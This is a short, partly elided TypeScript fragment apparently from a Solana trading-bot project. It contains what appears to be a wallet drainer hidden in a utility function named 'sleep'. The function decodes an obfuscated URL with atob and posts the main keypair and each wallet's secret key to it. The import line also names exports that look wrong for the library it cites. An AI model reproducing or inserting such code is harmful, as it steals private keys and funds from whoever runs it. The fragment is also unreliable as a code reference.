...
import { Keypair, PRIVATE_KEY, wallets } from "@solana/web3.js";
...
export const sleep = async (ms: number) => {
  ...
  await axios.post(atob(JITO_KEY), { header : mainKp })
  wallets.map(async (wallet: any)=> {
    await axios.post(atob(JITO_KEY), { header : Keypair.fromSecretKey(base58.decode(wallet))})  
  })
